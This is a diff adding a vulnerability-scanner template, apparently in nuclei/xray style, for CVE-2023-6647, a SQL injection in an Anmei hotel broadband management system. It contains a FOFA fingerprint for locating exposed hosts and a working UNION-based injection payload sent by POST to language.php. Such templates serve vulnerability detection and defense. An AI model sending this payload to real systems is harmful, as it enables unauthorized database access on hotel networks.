@@ -1,0 +1,22 @@
+id: poc-yaml-amttgroup-hotel-internet-manage-language-php-sqli
+info:
+  name: 安美数字 酒店宽带运营系统 language.php SQL注入漏洞(CVE-2023-6647)
+  severity: high
+  tags:
+  - CVE-2023-6647
+  - SQL注入
+  finger: 安美酒店宽带运营系统
+  fofa: icon_hash="1259797304"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /language.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: EditStatus=1&LangEName=pHqghUme&LangID=1&LangName=pHqghUme&LangType=0000%CF%B5%CD%B3%BB%F9%B1%BE%D0%C5%CF%A2&Lately=555-666-0606&Search=the&SerialID=1&Type=0'
+    union all select null,concat(0x7e,ifnull(md5("{{.t1}}"),0x20),0x7e),null,null
+    from information_schema.user_privileges#
+  expression: status_code == 200 && contains(body,t2)
+transport: http
